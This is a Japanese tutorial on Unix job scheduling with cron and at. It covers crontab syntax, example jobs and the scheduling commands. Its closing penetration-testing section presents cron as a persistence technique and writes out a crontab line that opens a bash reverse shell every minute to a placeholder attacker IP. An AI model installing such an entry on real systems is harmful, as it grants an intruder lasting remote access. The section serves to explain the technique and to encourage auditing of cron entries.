# ジョブスケジューリング（cron・at）

Unix/Linuxでコマンドやスクリプトを**定期実行**または**1回限りの予約実行**するための仕組み。

## なぜ存在するか

バックアップ・ログローテーション・定期レポート送信など、人の操作なしに決まった時刻・周期で実行したいタスクは多い。cronとatはそれぞれ繰り返し実行と一回限りの予約実行をOSレベルで提供する。

## cron — 定期実行

**crond**（cronデーモン）がバックグラウンドで常駐し、登録されたスケジュールに従ってコマンドを実行する。

### crontab の書式

```
分  時  日  月  曜日  コマンド
*   *   *   *   *     /path/to/command

# 毎日午前2時にバックアップを実行
0   2   *   *   *     /usr/local/bin/backup.sh

# 毎週月曜 9:00 にレポートを生成
0   9   *   *   1     /usr/local/bin/report.sh

# 5分ごとに死活監視
*/5  *   *   *   *    /usr/local/bin/healthcheck.sh
```

| フィールド | 範囲 |
|-----------|------|
| 分 | 0–59 |
| 時 | 0–23 |
| 日 | 1–31 |
| 月 | 1–12 |
| 曜日 | 0–7（0と7が日曜） |

### crontab コマンド

```bash
crontab -e   # 現在のユーザーのcrontabを編集
crontab -l   # 登録済みのジョブを表示
crontab -r   # すべてのジョブを削除
```

### システム全体のcron

`/etc/cron.d/`・`/etc/cron.daily/`・`/etc/cron.weekly/` などにスクリプトを置くとシステム全体のスケジュールとして動作する。rootを含む任意のユーザーで実行できる。

## at — 1回限りの予約実行

指定した時刻に**1度だけ**コマンドを実行する。実行後はジョブが消える。

```bash
# 今から30分後に実行
echo "/usr/local/bin/deploy.sh" | at now + 30 minutes

# 明日の14:00に実行
at 14:00 tomorrow

# 予約済みジョブの確認
atq

# ジョブの削除（ジョブ番号を指定）
atrm 3
```

## cron vs at

| | cron | at |
|-|------|----|
| 実行回数 | 繰り返し | 1回 |
| 用途 | 定期バッチ・監視・ログ処理 | デプロイ予約・1回限りの遅延実行 |
| 管理 | crontab ファイル | ジョブキュー（atqで確認） |

## ペネトレーションテストでの意味

cronは**持続化（Persistence）**の代表的な手段。シェルを確立した後、cronジョブを登録しておくと再起動後もアクセスを維持できる。

```bash
# 毎分リバースシェルを試みる（持続化の例）
* * * * * bash -i >& /dev/tcp/攻撃者IP/4444 0>&1
```

`/etc/cron.d/` や他ユーザーのcrontabへの書き込み権限がある場合、権限昇格にも悪用される。防御側はcronの登録内容を定期的に監査する必要がある。
